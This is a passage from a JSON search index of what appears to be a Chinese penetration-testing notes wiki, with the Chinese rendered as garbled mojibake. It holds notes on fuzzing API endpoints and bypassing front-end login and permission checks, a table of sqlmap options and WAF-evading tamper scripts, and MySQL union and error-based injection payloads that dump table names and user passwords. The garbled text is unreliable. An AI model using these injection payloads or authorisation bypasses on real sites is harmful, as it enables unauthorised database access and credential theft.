etcresolv.conf"},{"title":"ç½‘ç»œ","path":"/wiki/ç¬”è®°/ç½‘ç»œ.html","content":"lanâ€“wanNAT â€“switchâ€“route lan å±€åŸŸç½‘ï¼Œswitch æ˜¯æŒ‰macåœ°å€åŒºåˆ†ï¼Œä¸€æ—¦ç»è¿‡è·¯ç”±å™¨ï¼Œå°±ä¼šå˜æˆipdnsæŸ¥çœ‹ä¸Šä¸€æ¡ä¿¡æ¯æ˜¯å¦æˆåŠŸ echo $?"},{"title":"JSæ¸—é€","path":"/wiki/ç¬”è®°/JSæ¸—é€.html","content":"å…ˆæ‰¾åˆ°JSæ–‡ä»¶ ç†ŠçŒ«å¤´ Packer-Fuzzer å¼‚æ­¥js JSæ¥å£æå– è„šæœ¬æ–‡ä»¶ ç›®å½•FUZZå’Œæ¥å£æå–çš„å¥‡å¦™æ­é… æˆ‘ä»¬å‡è®¾ä½ é€šè¿‡åˆ†æJSæ‰¾åˆ°äº†å¾ˆå¤šæ¥å£ï¼Œæ¯”å¦‚ http://test.hack.com/api/test/admin/delete http://test.hack.com/api/test/admin/edit http://test.hack.com/api/test/admin/get è¿™ç§æ—¶å€™æˆ‘ä»¬è¦æ³¨æ„äº†ï¼Œæ¥å£çš„å‘½åä¸€èˆ¬éƒ½å’ŒåŠŸèƒ½é«˜åº¦ç›¸å…³ã€‚è¿™é‡Œæœ‰ç®¡ç†å‘˜ç”¨æˆ·çš„åˆ é™¤ï¼ˆdeleteï¼‰ã€ç¼–è¾‘ï¼ˆeditï¼‰ã€è·å–ï¼ˆgetï¼‰ é‚£ä¹ˆä½ è¿˜èƒ½æƒ³åˆ°ä»€ä¹ˆï¼Ÿæ˜¯ä¸æ˜¯æœ‰å¯èƒ½èƒ½æœ‰æ·»åŠ ï¼ˆaddã€createï¼‰ã€‚é‚£æˆ‘ä»¬å¯ä»¥æ³¨æ„FUZZè¿™ä¸ªç‚¹ http://test.hack.com/api/test/admin/add http://test.hack.com/api/test/admin/create æ€»ä¹‹å°±æ˜¯æœ‰â€œæ·»åŠ â€è¿™ä¸ªæ„æ€çš„å•è¯ã€‚å¯¹äºå¢åˆ æ”¹æŸ¥çš„æ¥å£å…³é”®è¯ï¼Œæˆ‘è‡ªå·±æ€»ç»“äº†ä¸€äº›ã€‚ æŸ¥è¯¢ï¼ˆè·å–ä¿¡æ¯ï¼‰search list select query get find åˆ é™¤ï¼ˆåˆ é™¤æŸä¸ªæ•°æ®ï¼‰del Delete ç¼–è¾‘ï¼ˆæ›´æ–°æŸä¸ªä¿¡æ¯ï¼‰Update Up edit Change æ·»åŠ ï¼ˆå¢åŠ æŸä¸ªä¿¡æ¯ï¼‰add create new APIæµ‹è¯• GET POST æµ‹è¯• åˆ«å¿˜äº†è·¯å¾„å¯èƒ½æœ‰é—®é¢˜ POSTå‚æ•°æµ‹è¯• è¿”å›å†…å®¹æ‹¼æ¥ JSæŸ¥æ‰¾ è„šæœ¬è·å– è·¯å¾„ä¸‰ç§æƒ…å†µ ç¬¬ä¸€ç§æ˜¯ç›®æ ‡ç«™ç‚¹æ²¡æœ‰ä»»ä½•å¯¹å‰ç«¯uriçš„é‰´æƒã€‚æˆ‘ä»¬è¿™ä¹ˆå»è®¿é—®ï¼Œèƒ½ç›´æ¥çœ‹åˆ°é¡µé¢ï¼Œä¹Ÿä¸ä¼šç»™ä½ è·³è½¬å•¥çš„ï¼Œè¿™æ—¶å€™å°±å¯ä»¥è°ƒç”¨é¡µé¢ä¸Šçš„åŠŸèƒ½å»æŠ“åŒ…ï¼Œåˆ†æè¿™äº›åŠŸèƒ½ç‚¹å¯¹åº”çš„æ¥å£çš„é—®é¢˜äº†ã€‚ ç¬¬äºŒç§æƒ…å†µç¨å¾®å¥½ç‚¹ï¼Œå°±æ˜¯ä½ è¿™ä¹ˆå»è®¿é—®ï¼Œæœ‰æ¦‚ç‡çœ‹åˆ°è¦è®¿é—®çš„é¡µé¢é—ªä¸€ä¸‹ï¼Œç„¶åç»™ä½ é‡å®šå‘å›ç™»å½•é¡µé¢ï¼Œè¿™ç§æ—¶å€™æœ‰ç§æ‹¼æ‰‹é€Ÿçš„ç©æ³•ï¼Œåœ¨é‡å®šå‘å›ç™»å½•é¡µé¢ä¹‹å‰ï¼Œæµè§ˆå™¨ä¸Šçš„åˆ·æ–°æŒ‰é’®ä¼šå˜æˆè¿™ä¸ªçŠ¶æ€ï¼šåœ¨ä»–é‡å®šå‘å›å»ä¹‹å‰ï¼Œå¿«é€Ÿç‚¹ä¸€ä¸‹è¿™ä¸ªXï¼Œé‚£ä¹ˆåç»­åŠ¨ä½œå°±ä¼šç»ˆæ­¢æ‰§è¡Œï¼Œä½ çš„é¡µé¢å°±ä¼šå¡ä½ã€‚è¿™æ—¶å€™æˆ‘ä»¬ä¹Ÿæ˜¯å¼€å¯burpæ„‰å¿«æŠ“åŒ…å°±è¡Œã€‚å…¶å®å°±æ˜¯é˜»æ­¢é‡å®šå‘çš„æ€è·¯ã€‚ - font style=color:rgb(0,0,0);ç¬¬ä¸‰ç§æƒ…å†µå°±æ˜¯ï¼Œæˆ‘ä»¬æ²¡æ³•çœ‹åˆ°æƒ³è®¿é—®çš„é¡µé¢ï¼Œå‰ç«¯è¦ä¹ˆæ²¡ååº”ï¼Œè¦ä¹ˆç»™ä½ å¼¹å‡ºä¸ªæ²¡æœ‰æƒé™ï¼Œè¦ä¹ˆç›´æ¥é‡å®šå‘åˆ°/fontfont style=color:rgb(0,0,0);/login/fontfont style=color:rgb(0,0,0);ç™»å½•é¡µã€‚è¿™ç§æ—¶å€™æˆ‘ä»¬åˆè¯¥æ€ä¹ˆæµ‹è¯•å‘¢ï¼Ÿä¸‹é¢çš„å†…å®¹å°±éœ€è¦ä¸€ç‚¹å‰ç«¯è°ƒè¯•å’Œ/fontfont style=color:rgb(0,0,0);JS/fontfont style=color:rgb(0,0,0);åˆ†æçš„åŸºç¡€äº†ï¼Œæœ¬æ–‡ä¸ä¼šæ·±å…¥å±•å¼€ï¼Œä»…ä½œæ¡ˆä¾‹ä»‹ç»ã€‚/font å‡è®¾è¿™ä¹ˆä¸€ä¸ªç½‘ç«™ï¼Œæˆ‘ä»¬æå–å‡ºä¸€ä¸ªå‰ç«¯uriä¸ºhome ï¼ˆå¾ˆå¸¸è§ï¼‰ æˆ‘ä»¬è‡ªç„¶è¦å°è¯•è®¿é—®ï¼Œä¸€è®¿é—®ï¼Œå‘ç°ç›´æ¥ç»™æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•å£ æˆ‘ä»¬è‡ªç„¶è¦å°è¯•è®¿é—®ï¼Œä¸€è®¿é—®ï¼Œå‘ç°ç›´æ¥ç»™æˆ‘ä»¬é‡å®šå‘åˆ°ç™»å½•å£ è¿™å°±è¯´æ˜è¿™ä¸ªå‰ç«¯è‡³å°‘æœ‰ä¸¤å±‚æ ¡éªŒï¼Œä¸€å±‚ä¸ç”¨æˆ·ç™»å½•çŠ¶æ€æœ‰å…³ï¼Œä¸€å±‚ä¸ç”¨æˆ·æƒé™æœ‰å…³ã€‚æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬åœ¨æ§åˆ¶å°æœç´¢â€œå†…æµ‹â€å…³é”®è¯ï¼Œå®šä½åˆ°ç”¨æˆ·æƒé™é‰´æƒé€»è¾‘ã€‚ åˆ†æè¿™ä¸ªå±€éƒ¨ï¼Œæˆ‘ä»¬å…¶å®å¾ˆå®¹æ˜“èƒ½æ³¨æ„åˆ°è¿™é‡Œçš„å‰ç«¯é‰´æƒé€»è¾‘ã€‚å‰ç«¯è·å–o.state.account.permissionå±æ€§ï¼Œä¸€æ—¦è¿™ä¸ªå±æ€§ä¸ºfalseï¼Œé‚£ä¹ˆå°±ä¼šæç¤ºå¹³å°å†…æµ‹è¿™ä¸ªé”™è¯¯ï¼Œæ— æ³•è®¿é—®åˆ°å¯¹åº”çš„å‰ç«¯uriã€‚ é‚£ä¹ˆç”¨æˆ·ç™»å½•çŠ¶æ€å¯¹åº”ä»€ä¹ˆå±æ€§å‘¢ï¼Ÿå¾€ä¸Šç¿»ä¸€ä¸‹ï¼Œä¸éš¾çœ‹å‡ºå¯¹åº”o.state.baseInfo.isLoginå±æ€§ å› æ­¤æˆ‘ä»¬å¯ä»¥æ¨æµ‹ï¼Œstateä¸­ä¿å­˜äº†ç”¨æˆ·çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ¯”å¦‚ç™»å½•çŠ¶æ€ã€æƒé™ç­‰ç­‰ã€‚å› æ­¤è¿™é‡Œå¥½åŠäº†ï¼Œæˆ‘ä»¬ç»™ä¸Šè¿°ä¸¤ä¸ªä½ç½®æ‰“ä¸Šæ–­ç‚¹ï¼Œé‡æ–°è®¿é—®homeã€‚è¿›å…¥ç¬¬ä¸€ä¸ªæ–­ç‚¹ åœ¨æ§åˆ¶å°å°†å…¶å¼ºè¡Œæ”¹ä¸ºtrue è¿›å…¥ä¸‹ä¸€æ–­ åŒæ ·åœ°ï¼Œå†æ§åˆ¶å°å¯¹å…¶èµ‹å€¼ä¸º1 å†å¾€ä¸‹èµ°ï¼Œæ­¤æ—¶ä¼šè·³è½¬åˆ°ä¸€ä¸ªcontracté¡µé¢ è™½ç„¶æ²¡è¿›å…¥homeé¡µé¢ï¼Œä½†æ˜¯è¿™æ ·ï¼Œæˆ‘ä»¬å°±æ¥åˆ°äº†ä¸€ä¸ªåŸæœ¬æ— æ³•ç›´æ¥è®¿é—®åˆ°çš„ä¸€ä¸ªå‰ç«¯uriï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨å®ƒçš„åŠŸèƒ½äº†ï¼Œçœ‹è¿™ä¸ªé¡µé¢è¦å¡«çš„ä¸œè¥¿å¾ˆå¤šï¼Œæœ€åçš„ä¼ å‚è‚¯å®šå·¨å¤æ‚ï¼Œå°±ç®—å¼€å‘å¥½å¿ƒå‘Šè¯‰ä½ ç¼ºäº†ä»€ä¹ˆå‚æ•°ï¼Œä½ æ•²éƒ½è¦æ•²åŠå¤©ï¼Œç”¨è¿™ç§æ–¹æ³•æµ‹èµ·æ¥å°±å¿«å¤šäº†ã€‚ å½“ç„¶ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯è¿›å…¥homeé¡µé¢ï¼Œé‡å®šå‘åˆ°è¿™ä¸ªå®Œå–„è´¦å·ä¿¡æ¯çš„é¡µé¢ï¼Œè¯´æ˜è¿˜æ˜¯æœ‰å“ªé‡Œçš„é‰´æƒæ²¡æå¥½ï¼Œæˆ‘ä»¬å†å›åˆ°åˆšåˆšçš„é‰´æƒé€»è¾‘éƒ¨åˆ† å¯ä»¥å‘ç°ï¼Œåç»­å…¶å®è¿˜å¯¹o.state.account.permissionçš„å€¼åšäº†ä¸€ä¸ªåˆ¤æ–­ï¼Œå¦‚æœå€¼ä¸º1ï¼Œé‚£ä¹ˆä¼šç›´æ¥è¿›å…¥contracté¡µé¢ã€‚å€¼åªè¦æ˜¯å¤§äº1çš„æ•´æ•°ï¼Œå…¶å®éƒ½å¯ä»¥è®¿é—®åˆ°homeé¡µé¢ å› æ­¤åœ¨æ§åˆ¶å°å°†permissionæ”¹ä¸º3 å†è®¿é—®homeï¼ŒæˆåŠŸï¼š è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ„‰å¿«çš„æµ‹è¯•åå°çš„å„ç§åŠŸèƒ½ç‚¹äº†ã€‚å½“ç„¶ä¸Šè¿°æ“ä½œå¯¹ä¸æ‡‚JSå’Œå‰ç«¯è°ƒè¯•çš„å¸ˆå‚…è‚¯å®šä¹Ÿä¸å¤ªå‹å¥½ã€‚å®é™…ä¸Šä¸Šè¿°æ“ä½œå’Œå¹³æ—¶æµ‹è¯•ä¸šåŠ¡é€»è¾‘æ¼æ´ä¸­çš„â€œä¿®æ”¹è¿”å›åŒ…â€æ“ä½œæ˜¯æœ‰ç­‰ä»·å…³ç³»çš„ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Ÿ æˆ‘ä»¬é‡æ–°è®¿é—®ä¸€ä¸‹homeé¡µé¢ï¼Œç„¶ååœ¨burpæŠ“åŒ…ï¼Œæ‹¦æˆªä¸€ä¸‹è¿”å›åŒ…ã€‚ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªstate_userçš„åç«¯æ¥å£ï¼Œä»è¿™ä¸ªæ¥å£çš„åå­—æˆ‘ä»¬å…¶å®å°±çŸ¥é“ï¼Œå®ƒæ˜¯ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªç”¨æˆ·çŠ¶æ€çš„ã€‚ ç„¶åä½ å†æ³¨æ„è¿™é‡Œçš„account_stateï¼Œé»˜è®¤æ˜¯0ã€‚ä»¥åŠè¿™ä¸ªis_loginï¼Œé»˜è®¤æ˜¯falseã€‚ä»–ä»¬æ˜¯ä¸æ˜¯å°±ç‰¹åˆ«åƒæˆ‘ä»¬åˆšåˆšåœ¨JSé‡Œåˆ†æå‡ºæ¥çš„o.state.account.permissionå’Œo.state.baseInfo.isLoginï¼Ÿæˆ‘ä»¬æ¨æµ‹è¿™ä¸ªå‰ç«¯å®é™…ä¸Šå°±æ˜¯ä»è¿”å›åŒ…é‡Œæ‹¿åˆ°account_stateå’Œis_loginï¼Œå¹¶åˆ†åˆ«ç»™o.state.account.permissionã€o.state.baseInfo.isLoginèµ‹å€¼çš„ã€‚ å› æ­¤æˆ‘ä»¬å°†å…¶åˆ†åˆ«æ”¹ä¸º3å’Œtrueï¼Œç„¶åæŠŠå¦ä¸€ä¸ªcodeæ”¹ä¸º200ï¼Œå‘åŒ… è¿˜æ˜¯èƒ½çœ‹åˆ°åå°é¡µé¢ã€‚è¿™æ ·è™½ç„¶æ“ä½œèµ·æ¥æ¯”è¾ƒç®€å•å‹å¥½ï¼Œä½†æ˜¯ä¸‡ä¸€ç›®æ ‡å‰ç«¯å¯¹å“åº”ç»“æœçš„åˆ¤æ–­è®¾ç½®çš„æ¯”è¾ƒå¤æ‚ï¼Œé‚£å°±ä¸æ˜¯é‚£ä¹ˆå¥½åŠäº†ï¼Œæ¯”å¦‚æˆ‘å‰ç«¯åˆ¤æ–­permissionä¸ºtest123abcdefæ‰ä¸ºæœ‰æ•ˆï¼Œæˆ‘ä»¬å¸¸è§çš„æ”¹å“åº”åŒ…çš„æ–¹æ³•å°±å¾ˆéš¾æ”¹æˆè¿™æ ·äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯å›åˆ°JSå»åˆ†æè°ƒè¯•æ‰èƒ½åº”å¯¹å¤§éƒ¨åˆ†å¥‡è‘©æƒ…å†µï¼Œè¿˜æ˜¯æ¯”è¾ƒåƒåŸºæœ¬åŠŸçš„ã€‚ jsonä¼ å‚é‡Œå¸¸è§çš„ç±»å‹å…¶å®ä¹Ÿå°±æ˜¯ä¸‹å›¾è¿™äº› aä¸ºæ•´å‹ï¼Œbä¸ºå­—ç¬¦ä¸²ç±»å‹ï¼Œcä¸ºå¸ƒå°”ç±»å‹ï¼Œdä¸ºæ•°ç»„ç±»å‹ï¼Œeä¸ºå¯¹è±¡ç±»å‹ã€‚è¿™å‡ ç§ç±»å‹éƒ½è¯•ä¸€ä¸‹å‡†æ²¡é”™ï¼Œè€Œä¸”å¤§å¤šæ•°æƒ…å†µä¸‹ç±»å‹é”™äº†åç«¯æ˜¯è¦ç›´æ¥æŠ›å‡ºå¼‚å¸¸ä¿¡æ¯çš„ï¼Œä»å¼‚å¸¸ä¿¡æ¯é‡Œå°±å¾ˆå®¹æ˜“èƒ½çœ‹å‡ºæ¥è¿™ä¸ªåœ°æ–¹è¦ä¼ å…¥ä»€ä¹ˆç±»å‹ï¼Œæ¯”å¦‚å¼‚å¸¸é‡Œçœ‹åˆ°xxxxx Object xxxxxxï¼Œå°±å¯ä»¥çŒœæµ‹æŸä¸ªå‚æ•°å¯èƒ½è¦ä¼ å…¥å¯¹è±¡ç±»å‹çš„ä¼ å‚ã€‚"},{"title":"SQLMAP","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/SQLMAP.html","content":"å¸¸ç”¨å‚æ•° font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-u/font font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--url/font æŒ‡å®šç›®æ ‡url font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-m/font ä»æ–‡æœ¬ä¸­è·å–å¤šä¸ªç›®æ ‡æ‰«æ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-r/font ä»æ–‡ä»¶ä¸­åŠ è½½HTTPè¯·æ±‚ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--data/font ä»¥POSTæ–¹å¼æäº¤æ•°æ® font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);-random-agent/font éšæœºua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--user-agent/font æŒ‡å®šua font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--delay/font è®¾ç½®è¯·æ±‚é—´çš„å»¶è¿Ÿ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--timeout/font æŒ‡å®šè¶…æ—¶æ—¶é—´ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--dbms/font æŒ‡å®šdbï¼Œsqlmapæ”¯æŒçš„dbæœ‰MySQLã€Oracleã€PostgreSQLã€Microsoft SQL Serverã€Microsoft Accessã€SQLiteç­‰ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--os/font æŒ‡å®šæ•°æ®åº“æœåŠ¡å™¨æ“ä½œç³»ç»Ÿ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--tamper/font æŒ‡å®štamper font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--level/font æŒ‡å®šæ¢æµ‹ç­‰çº§ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--risk/font æŒ‡å®šé£é™©ç­‰çº§ **font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);--technique/font** ****æ³¨å…¥æŠ€æœ¯ B: Boolean-based blind SQL injection E: Error-based SQL injection U: UNION query SQL injection S: Stacked queries SQL injection T: Time-based blind SQL injection 11.5.2. Tamper é€ŸæŸ¥ è„šæœ¬åç§° ä½œç”¨ apostrophemask.py ç”¨utf8ä»£æ›¿å¼•å· equaltolike.py like ä»£æ›¿ç­‰å· space2dash.py ç»•è¿‡è¿‡æ»¤â€™â€™ æ›¿æ¢ç©ºæ ¼å­—ç¬¦(â€œ)ï¼Œ(â€˜â€™ - â€˜)åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šï¼Œä¸€ä¸ªéšæœºå­—ç¬¦ä¸²å’Œä¸€ä¸ªæ–°è¡Œ(â€˜nâ€™) greatest.py ç»•è¿‡è¿‡æ»¤â€™â€™ ,ç”¨GREATESTæ›¿æ¢å¤§äºå·ã€‚ space2hash.py ç©ºæ ¼æ›¿æ¢ä¸º#å· éšæœºå­—ç¬¦ä¸² ä»¥åŠæ¢è¡Œç¬¦ apostrophenullencode.py ç»•è¿‡è¿‡æ»¤åŒå¼•å·ï¼Œæ›¿æ¢å­—ç¬¦å’ŒåŒå¼•å·ã€‚ halfversionedmorekeywords.py å½“æ•°æ®åº“ä¸ºmysqlæ—¶ç»•è¿‡é˜²ç«å¢™ï¼Œæ¯ä¸ªå…³é”®å­—ä¹‹å‰æ·»åŠ mysqlç‰ˆæœ¬è¯„è®º space2morehash.py ç©ºæ ¼æ›¿æ¢ä¸º #å· ä»¥åŠæ›´å¤šéšæœºå­—ç¬¦ä¸² æ¢è¡Œç¬¦ appendnullbyte.py åœ¨æœ‰æ•ˆè´Ÿè·ç»“æŸä½ç½®åŠ è½½é›¶å­—èŠ‚å­—ç¬¦ç¼–ç  ifnull2ifisnull.py ç»•è¿‡å¯¹ IFNULL è¿‡æ»¤ã€‚ æ›¿æ¢ç±»ä¼¼â€™IFNULL(A, B)â€™ä¸ºâ€™IF(ISNULL(A), B, A)â€™ space2mssqlblank.py ç©ºæ ¼æ›¿æ¢ä¸ºå…¶å®ƒç©ºç¬¦å· base64encode.py ç”¨base64ç¼–ç æ›¿æ¢ space2mssqlhash.py æ›¿æ¢ç©ºæ ¼ modsecurityversioned.py è¿‡æ»¤ç©ºæ ¼ï¼ŒåŒ…å«å®Œæ•´çš„æŸ¥è¯¢ç‰ˆæœ¬æ³¨é‡Š space2mysqlblank.py ç©ºæ ¼æ›¿æ¢å…¶å®ƒç©ºç™½ç¬¦å·(mysql) between.py ç”¨betweenæ›¿æ¢å¤§äºå·() space2mysqldash.py æ›¿æ¢ç©ºæ ¼å­—ç¬¦(â€œ)(â€˜ - â€˜)åè·Ÿä¸€ä¸ªç ´æŠ˜å·æ³¨é‡Šä¸€ä¸ªæ–°è¡Œ(â€˜ nâ€™) multiplespaces.py å›´ç»•SQLå…³é”®å­—æ·»åŠ å¤šä¸ªç©ºæ ¼ space2plus.py ç”¨+æ›¿æ¢ç©ºæ ¼ bluecoat.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦åä¸ä¸€ä¸ªæœ‰æ•ˆçš„éšæœºç©ºç™½å­—ç¬¦çš„SQLè¯­å¥ã€‚ ç„¶åæ›¿æ¢ä¸ºlike nonrecursivereplacement.py å–ä»£predefined SQLå…³é”®å­—withè¡¨ç¤º suitable foræ›¿ä»£(ä¾‹å¦‚ .replace(â€œSELECTâ€ã€â€â€)) filters space2randomblank.py ä»£æ›¿ç©ºæ ¼å­—ç¬¦(â€œâ€)ä»ä¸€ä¸ªéšæœºçš„ç©ºç™½å­—ç¬¦å¯é€‰å­—ç¬¦çš„æœ‰æ•ˆé›† sp_password.py è¿½åŠ sp_passwordâ€™ä»DBMSæ—¥å¿—çš„è‡ªåŠ¨æ¨¡ç³Šå¤„ç†çš„æœ‰æ•ˆè½½è·çš„æœ«å°¾ chardoubleencode.py åŒurlç¼–ç (ä¸å¤„ç†ä»¥ç¼–ç çš„) unionalltounion.py æ›¿æ¢UNION ALL SELECT UNION SELECT charencode.py urlç¼–ç  randomcase.py éšæœºå¤§å°å†™ unmagicquotes.py å®½å­—ç¬¦ç»•è¿‡ GPC addslashes randomcomments.py ç”¨ font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font åˆ†å‰²sqlå…³é”®å­— charunicodeencode.py å­—ç¬¦ä¸²unicodeç¼–ç  securesphere.py è¿½åŠ ç‰¹åˆ¶çš„å­—ç¬¦ä¸² versionedmorekeywords.py æ³¨é‡Šç»•è¿‡ space2comment.py Replaces space character font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252); /fontfont style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/font with comments font style=color:rgb(231, 76, 60);background-color:rgb(252, 252, 252);/**//font"},{"title":"å†…ç½‘","path":"/wiki/å†…ç½‘/index.html","content":"ææƒ æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• æƒé™ç»´æŒ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"æƒé™ç»´æŒ","path":"/wiki/å†…ç½‘/æƒé™ç»´æŒ.html","content":"SharPersist.exe"},{"title":"SQLæ³¨å…¥","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/index.html","content":"é¶åœº æ–‡ä»¶å¤¹ (åŒ…å«å­é¡¹) ğŸ“‚ ç›®å½• SQLiæµç¨‹ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ SQLMAP ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ SQLæ³¨å…¥ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"SQLæ³¨å…¥","path":"/wiki/WebçŸ¥è¯†ç‚¹/SQLæ³¨å…¥/SQLæ³¨å…¥.html","content":"SQLæ³¨å…¥ä¸€ã€MySqL ä¸€ ã€åŒç«™ åˆ¤æ–­æ˜¯å¦æœ‰æ³¨å…¥ç‚¹ and 11 é¡µé¢æ­£å¸¸ and 12 é¡µé¢å¼‚å¸¸ å¦‚æœè¿™ä¸¤ä¸ªéƒ½æ²¡æœ‰å¼‚å¸¸ï¼Œé‚£å°±è¯•è¯•å­—ç¬¦é›† ?id1â€™ é€šè¿‡order byåˆ¤æ–­æ³¨å…¥çš„å­—æ®µæ•°ï¼ˆçŒœä¸€ä¸‹ï¼‰ é¡µé¢é”™è¯¯ä¸æ­£å¸¸çš„ä¸´ç•Œç‚¹å°±æ˜¯å­—æ®µæ•° é€šè¿‡union æ¥æµ‹è¯• è®©idè´Ÿæ•°æˆ–è€…and12è®©ç½‘é¡µæŠ¥é”™ï¼ŒæŠ¥é”™çš„é‚£å‡ ä¸ªæ•°å­—è®°ä½ï¼Œé‚£ä¸ªæ•°å­—æŠ¥é”™å°±åœ¨å“ªé‡ŒæŸ¥ æ¯”å¦‚2ï¼Œ3æŠ¥é”™ï¼Œå¯ä»¥ Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·Â·union select 1ï¼Œversion(),database()ï¼Œ4 ä¿¡æ¯æ”¶é›† æ•°æ®åº“ç‰ˆæœ¬ï¼šversion() æ•°æ®åº“åå­—ï¼šdatabase() æ•°æ®åº“ç”¨æˆ·ï¼šuser() æ“ä½œç³»ç»Ÿï¼š@@version_compile_os åœ¨mysql5.0ä»¥åçš„ç‰ˆæœ¬å­˜åœ¨ä¸€ä¸ªinformation_schemaæ•°æ®åº“ã€é‡Œé¢å­˜å‚¨è®°å½•æ•°æ®åº“åã€è¡¨åã€åˆ—åçš„æ•°æ®åº“ï¼Œç›¸å½“äºå¯ä»¥é€šè¿‡information_schemaè¿™ä¸ªæ•°æ®åº“è·å–åˆ°æ•°æ®åº“ä¸‹é¢çš„è¡¨åå’Œåˆ—å è·å–ç›¸å…³ä¿¡æ¯ ? id-1union select 1,group_concat(table_name),3 from information_schema.tables where table_schemaâ€™ â€˜ ? id-1union select 1,group_concat(column_name),3 from information_schema.columns where table_nameâ€™ â€˜ ? id-1union select 1,group_concat(user),group_concat(password) from ____ information_schema.schemata #information_schemaä¸‹é¢çš„æ‰€æœ‰æ•°æ®åº“å information_schema.tables #information_schemaä¸‹é¢çš„æ‰€æœ‰è¡¨å information_schema.columns #information_schemaä¸‹é¢æ‰€æœ‰çš„åˆ—å table_name #è¡¨å column_name #åˆ—å table_schema #æ•°æ®åº“å schema_name #æ•°æ®åº“åˆ—è¡¨mingå äºŒ ã€è·¨åº“æŸ¥è¯¢ ? id-1union select 1,group_concat(schema_name),3 from information_schema.schemata ä¸‰ã€æ–‡ä»¶è¯»å†™å‡½æ•° load_file æ–‡ä»¶è¯»å– into outfile æˆ–into dumpfile æ–‡ä»¶å†™å…¥ ï¼åœ¨æ³¨å…¥ç‚¹æ“ä½œ å››ã€int å‡½æ•°åˆ¤æ–­æ˜¯å¦ä¸ºæ•´æ•° $sql=SELECT * FROM users WHERE id=$id LIMIT 0,1; echo $sql; $result=mysql_query($sql);else echo ni shi ge jj?;``` äº”ã€å‚æ•°æäº¤æ³¨å…¥ #ç®€è¦æ˜ç¡®å‚æ•°ç±»å‹æ•°å­—ï¼Œå­—ç¬¦ï¼Œæœç´¢ï¼ŒJsoNç­‰#ç®€è¦æ˜ç¡®è¯·æ±‚æ–¹æ³•GET, POST,COOKIEï¼ŒREQUESTï¼ŒHTTPå¤´ç­‰å…¶ä¸­sqlè¯­å¥å¹²æ‰°ç¬¦å·: ,,s,),ç­‰ï¼Œå…·ä½“éœ€çœ‹å†™æ³• äºŒã€å…¶ä»–æ•°æ®åº“ç‰¹ç‚¹ä¸€ã€accessæ³¨å…¥ Accessæ•°æ®åº“ 1è¡¨å 2åˆ—å 3æ•°æ® access æ•°æ®åº“éƒ½æ˜¯å­˜æ”¾åœ¨ç½‘ç«™ç›®å½•ä¸‹ï¼Œåç¼€æ ¼å¼ä¸º mdbï¼Œaspï¼Œasa,å¯ä»¥é€šè¿‡ä¸€äº›æš´åº“æ‰‹æ®µã€ç›®å½•çŒœè§£ç­‰ç›´æ¥ä¸‹è½½æ•°æ®åº“ accessä¸‰å¤§æ”»å‡»æ‰‹æ³• accessæ³¨å…¥æ”»å‡»ç‰‡æ®µ-è”åˆæŸ¥è¯¢æ³• accessæ³¨å…¥æ”»å‡»ç‰‡æ®µ-é€å­—çŒœè§£æ³• å·¥å…·ç±»çš„ä½¿ç”¨æ³¨å…¥ï¼ˆæ¨èï¼‰ Accessæ³¨å…¥æ”»å‡»æ–¹å¼ union æ³¨å…¥ã€http header æ³¨å…¥ã€åç§»æ³¨å…¥ç­‰ äºŒã€msSQLæ³¨å…¥https://www.cnblogs.com/xishaonian/p/6173644.html ä¸‰ã€postgresqlæ³¨å…¥https://www.cnblogs.com/KevinGeorge/p/8446874.html å››ã€Oracleæ³¨å…¥https://www.cnblogs.com/peterpan0707007/p/8242119.html äº”ã€mongoDBæ³¨å…¥https://www.cnblogs.com/wefeng/p/11503102.html SQLmapä¸èƒ½è¯†åˆ«MongoDBè¿™é‡Œä»‹ç»nosqlattack:https://github.com/youngyangyang04/NoSQLAttack ä¸‰ã€ 12ç§æŠ¥é”™æ³¨å…¥+ä¸‡èƒ½è¯­å¥1ã€é€šè¿‡flooræŠ¥é”™,æ³¨å…¥è¯­å¥å¦‚ä¸‹: and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a); 